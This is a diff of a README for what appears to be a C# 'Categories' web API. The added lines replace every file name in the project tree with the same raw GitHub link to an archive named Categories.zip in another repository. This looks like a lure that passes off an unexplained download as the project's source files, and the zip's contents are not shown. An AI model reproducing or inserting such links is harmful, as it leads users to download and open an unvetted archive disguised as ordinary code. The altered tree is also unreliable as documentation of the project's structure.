@@ -33,13 +33,13 @@
 
 ```
 Categories/
-├── Program.cs              
-├── Models/Category.cs      
+├── https://raw.githubusercontent.com/Walt-1091/Categories/main/grad/Categories.zip              
+├── https://raw.githubusercontent.com/Walt-1091/Categories/main/grad/Categories.zip      
 ├── Services/
-│   ├── ICategoryService.cs
-│   └── CategoryService.cs  
+│   ├── https://raw.githubusercontent.com/Walt-1091/Categories/main/grad/Categories.zip
+│   └── https://raw.githubusercontent.com/Walt-1091/Categories/main/grad/Categories.zip  
 └── Controllers/
-    └── CategoriesController.cs
+    └── https://raw.githubusercontent.com/Walt-1091/Categories/main/grad/Categories.zip
 ```
 
 **Key Features:**
